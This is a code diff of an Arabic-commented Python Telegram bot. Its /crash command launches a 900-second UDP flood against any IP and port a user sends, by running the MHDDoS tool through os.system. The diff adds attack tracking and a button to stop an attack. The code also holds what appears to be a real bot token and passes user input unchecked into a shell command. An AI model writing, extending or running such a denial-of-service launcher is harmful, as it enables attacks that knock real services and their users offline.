@@ -1,16 +1,20 @@
 import telebot
 import os
 import time
+from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
 
 # هنا حط التوكن تا البوت تاك
 TOKEN = "7684261013:AAGDDOGFZ8Uz2Vlp8CCF_UWr9uLyi5X1ejc"
 bot = telebot.TeleBot(TOKEN)
 
 # قائمة المستخدمين المسموح لهم بدون حد زمني
-ALLOWED_USERS = [1480248962, 8068341198]  # ضع هنا معرّفات المستخدمين (Telegram User IDs)
+ALLOWED_USERS = [123456789, 987654321]  # ضع هنا معرّفات المستخدمين (Telegram User IDs)
 
 # قواميس لتتبع آخر وقت تنفيذ الأمر لكل مستخدم
 user_last_used = {}
+
+# لتتبع الهجمات النشطة
+active_attacks = {}
 
 @bot.message_handler(commands=['crash'])
 def handle_crash_command(message):
@@ -57,11 +61,39 @@ def handle_crash_command(message):
         response = f"Spamming this IP ===> {ip}:{port} for 900 seconds"
         bot.reply_to(message, response)
 
-        # تحضير الأمر باش يشغل الكود
+        # بدء الهجوم
+        attack_id = f"{user_id}_{ip}_{port}"  # تعريف للهجوم بناءً على المستخدم والـ IP
+        active_attacks[attack_id] = True  # تسجيل الهجوم كنشط
         command = f'python3 /workspaces/MHDDoS/start.py UDP {ip}:{port} 100 900'
         os.system(command)
+
+        # إرسال زر لإيقاف الهجوم
+        markup = InlineKeyboardMarkup()
+        stop_button = InlineKeyboardButton("🛑 إيقاف الهجوم", callback_data=f"stop_{attack_id}")
+        markup.add(stop_button)
+        bot.send_message(message.chat.id, "يمكنك إيقاف الهجوم بالضغط على الزر أدناه:", reply_markup=markup)
     except Exception as e:
         bot.reply_to(message, f"صارت مشكلة: {str(e)}")
+
+@bot.callback_query_handler(func=lambda call: call.data.startswith("stop_"))
+def handle_stop_command(call):
+    try:
+        # استخراج معرف الهجوم
+        attack_id = call.data.split("stop_")[1]
+
+        # التحقق إذا كان الهجوم موجودًا ونشطًا
+        if attack_id in active_attacks and active_attacks[attack_id]:
+            # تنفيذ أمر إيقاف الهجوم
+            os.system("python3 /workspaces/MHDDoS/start.py stop")
+            active_attacks[attack_id] = False  # تحديث حالة الهجوم
+
+            # إعلام المستخدم بإيقاف الهجوم
+            bot.answer_callback_query(call.id, "تم إيقاف الهجوم بنجاح.")
+            bot.send_message(call.message.chat.id, "✅ الهجوم توقف.")
+        else:
+            bot.answer_callback_query(call.id, "الهجوم غير نشط أو توقف بالفعل.")
+    except Exception as e:
+        bot.send_message(call.message.chat.id, f"صارت مشكلة أثناء إيقاف الهجوم: {str(e)}")
 
 # تشغيل البوت
 print("بوت تليجرام راهو يخدم...")
